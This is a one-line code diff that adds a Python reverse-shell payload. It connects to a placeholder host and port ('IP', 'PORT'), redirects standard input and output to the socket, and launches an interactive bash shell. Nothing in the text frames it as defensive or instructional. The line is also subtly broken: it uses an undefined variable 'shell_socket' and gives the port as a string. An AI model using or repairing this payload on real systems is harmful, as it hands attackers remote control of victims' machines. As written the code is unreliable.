@@ -1,0 +1,1 @@
+import socket,os, subprocess;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",'PORT'));os.dup2(shell_socket.fileno(),0);os.dup2(shell_socket.fileno(),1);os.dup2(shell_socket.fileno(),2);p = subprocess.call(["/bin/bash","-i"]);
